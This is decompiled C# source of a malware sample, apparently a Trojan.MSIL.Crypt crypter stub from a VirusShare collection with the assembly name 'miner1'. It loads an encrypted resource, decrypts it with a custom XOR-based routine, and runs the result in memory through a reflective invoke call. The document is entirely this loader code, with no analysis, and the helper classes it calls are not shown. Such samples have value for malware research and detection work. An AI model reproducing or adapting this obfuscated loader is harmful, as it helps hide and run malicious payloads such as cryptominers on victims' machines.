// Decompiled with JetBrains decompiler
// Type: lRoSfMqTdH
// Assembly: miner1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=9ce2e0bc23b1584c
// MVID: 18758A91-3AE2-445F-93F7-B4B6F4C0BD10
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Crypt.gvw-cfa458247230499a84b8bace00769c691d7a44c3ec65103371af2875471e0507.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Text;

public class lRoSfMqTdH
{
  [STAThread]
  public static void Main()
  {
    RManager rmanager = new RManager();
    string Data = Conversions.ToString(rmanager.RRM().GetObject("cKsKpXdBlA"));
    lRoSfMqTdH._EI ei = new lRoSfMqTdH._EI(lRoSfMqTdH.Retrieve(ref Data, (byte[]) rmanager.RRM().GetObject("aYvEs")));
  }

  public static byte[] Retrieve(ref string Data, byte[] KB)
  {
    byte[] bytes = Encoding.Default.GetBytes(Data);
    int num1 = checked (bytes.Length - 1 * 8);
    int num2 = 0;
    while (num2 <= num1)
    {
      bytes[num2 % bytes.Length] = checked ((byte) unchecked (checked (((int) bytes[unchecked (num2 % bytes.Length)] ^ (int) KB[unchecked (num2 % KB.Length)]) - (int) bytes[unchecked (checked (num2 + 1) % bytes.Length)] + 256) % 256));
      checked { ++num2; }
    }
    Array.Resize<byte>(ref bytes, checked (bytes.Length - 1));
    return bytes;
  }

  public class _EI
  {
    private byte[] AE;

    public _EI(byte[] AE)
    {
      this.AE = AE;
      this.RET();
    }

    public void RET() => EX.IM(this.AE, "A", "_RECALL", new object[0]);
  }
}
